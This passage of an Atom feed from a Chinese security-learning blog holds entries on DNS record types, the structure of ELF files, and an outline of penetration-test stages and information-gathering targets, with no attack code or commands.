serve)：域名服务器记录，可将指定域名交由其他DNS服务商解析管理(如f1g1ns1.dnspod.net)</p><p>AAAA：将域名指向一个IPv6地址(如ff06:0:0:0:0:0:0:c3)</p><p><a href="https://www.strerr.com/cn/nslookup.html">DNS域名在线查询 - www.strerr.com</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><p><a href="http://www.jsons.cn/nslookup/">在线域名解析记录检测-在线Nslookup域名解析查询工具</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-域名是什么&quot;&gt;&lt;a href=&quot;#1-域名是什么&quot; class=&quot;headerlink&quot; title=&quot;1.域名是什么?&quot;&gt;&lt;/a&gt;1.域名是什么?&lt;/h1&gt;&lt;p&gt;用来代替IP，找到网络上的一台计算机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/./../../../</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="渗透测试" scheme="https://rhea006.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ELF文件格式</title>
    <link href="https://rhea006.github.io/2025/06/97ad919e2462.html"/>
    <id>https://rhea006.github.io/2025/06/97ad919e2462.html</id>
    <published>2025-06-28T12:16:36.000Z</published>
    <updated>2025-06-30T13:13:12.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h1><p>1.可执行文件（Executable File）[.exec]:经过链接的、可执行的目标文件，通常也称为程序。</p><p>2.可重定位文件（Relocatable File）（可重定位目标文件）[.rel]:由源代码编译生成，包含编译后的二进制代码和数据，但未完成链接过程，通常以”.o”作为扩展名。</p><p>3.共享目标文件（Shared Object file）[.dyn]:动态链接库文件。可被多个程序共享使用，在运行时加载到内存。</p><h1 id="ELF-文件结构"><a href="#ELF-文件结构" class="headerlink" title="ELF 文件结构"></a>ELF 文件结构</h1><p>ELF 文件通过特定的格式组织数据，主要结构包括：</p><h4 id="1-ELF-文件头（ELF-Header）"><a href="#1-ELF-文件头（ELF-Header）" class="headerlink" title="1. ELF 文件头（ELF Header）"></a><strong>1. ELF 文件头（ELF Header）</strong></h4><ul><li>位于文件起始位置，描述文件的基本属性。</li><li>关键字段：<ul><li><strong>EI_MAGIC</strong>：文件魔数（如<code>0x7F ELF</code>），用于标识 ELF 格式。[7f 45 4c 46即字符串“\177ELF“]</li><li><strong>EI_CLASS</strong>：位数（32 位或 64 位）。</li><li><strong>EI_DATA</strong>：字节序（大端或小端）。</li><li><strong>e_type</strong>：文件类型（可执行文件、共享库等）。</li><li><strong>e_entry</strong>：程序入口地址。</li></ul></li></ul><h4 id="2-程序头表-段表（Program-Header-Table）"><a href="#2-程序头表-段表（Program-Header-Table）" class="headerlink" title="2. 程序头表&#x2F;段表（Program Header Table）"></a><strong>2. 程序头表&#x2F;段表（Program Header Table）</strong></h4><ul><li>描述文件在内存中的布局，用于加载器将文件映射到内存。</li><li>关键字段：<ul><li><strong>p_type</strong>：段类型（如代码段、数据段、动态链接段）。</li><li><strong>p_vaddr</strong>：内存虚拟地址。</li><li><strong>p_filesz</strong>：文件中占用的大小。</li><li><strong>p_memsz</strong>：内存中占用的大小。</li></ul></li></ul><h4 id="3-节头表（Section-Header-Table）"><a href="#3-节头表（Section-Header-Table）" class="headerlink" title="3. 节头表（Section Header Table）"></a><strong>3. 节头表（Section Header Table）</strong></h4><ul><li>描述文件中的各个 “节”（Section），用于链接器处理目标文件。</li><li>常见节类型：<ul><li><strong>.text</strong>：可执行代码段。</li><li><strong>.data</strong>：已初始化的全局变量和静态变量。</li><li><strong>.bss</strong>：未初始化的全局变量和静态变量（运行时自动初始化为 0）。</li><li><strong>.rodata</strong>：只读数据段（如字符串常量）。</li><li><strong>.symtab</strong>：符号表，记录函数和变量的名称、地址等。</li><li><strong>.strtab</strong>：字符串表，存储符号表中的字符串内容。</li></ul></li></ul><h4 id="4-节（Sections）"><a href="#4-节（Sections）" class="headerlink" title="4. 节（Sections）"></a><strong>4. 节（Sections）</strong></h4><ul><li>具体存储代码、数据、元信息的区域，不同类型的 ELF 文件包含的节不同。</li><li>示例：<ul><li>可执行文件：包含<code>.text</code>、<code>.data</code>、<code>.dynamic</code>（动态链接信息）等。</li><li>目标文件：包含<code>.text</code>、<code>.rel.text</code>（代码重定位信息）等。</li></ul></li></ul><p><img src="/./../../../../../images/image-20250629223418086.png" alt="image-20250629223418086"></p><p><img src="/./../../../../../images/image-20250629223515561.png" alt="image-20250629223515561"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ELF文件类型&quot;&gt;&lt;a href=&quot;#ELF文件类型&quot; class=&quot;headerlink&quot; title=&quot;ELF文件类型&quot;&gt;&lt;/a&gt;ELF文件类型&lt;/h1&gt;&lt;p&gt;1.可执行文件（Executable File）[.exec]:经过链接的、可执行的目标文件，通常也</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="2-ELF文件格式" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/2-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/a0cca283eeaf.html"/>
    <id>https://rhea006.github.io/2025/06/a0cca283eeaf.html</id>
    <published>2025-06-28T07:09:15.147Z</published>
    <updated>2025-06-30T04:13:35.565Z</updated>
    
    <content type="html"><![CDATA[<p>title: 信息收集概览<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h1><h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><h3 id="信息收集包括内容"><a href="#信息收集包括内容" class="headerlink" title="信息收集包括内容"></a>信息收集包括内容</h3><h3 id="收集范围："><a href="#收集范围：" class="headerlink" title="收集范围："></a>收集范围：</h3><p>域名信息、IP段、开放的端口、网站架构、文件目录结构、软件版本、WAF、旁站、C段…</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>1.域名相关信息</p><p>2.IP相关信息</p><p>3.端口服务相关信息</p><p>4.指纹识别（CMS&#x2F;CDF&#x2F;WAF）</p><p>5.Google Hacking</p><p>6.目录信息</p><p>7.Git Hack</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 信息收集概览&lt;br&gt;date: 2025-06-28 20:16:36&lt;br&gt;categories:&lt;br&gt;tags: -渗透测试&lt;/p&gt;
&lt;h1 id=&quot;渗透测试的流程&quot;&gt;&lt;a href=&quot;#渗透测试的流程&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
</feed>
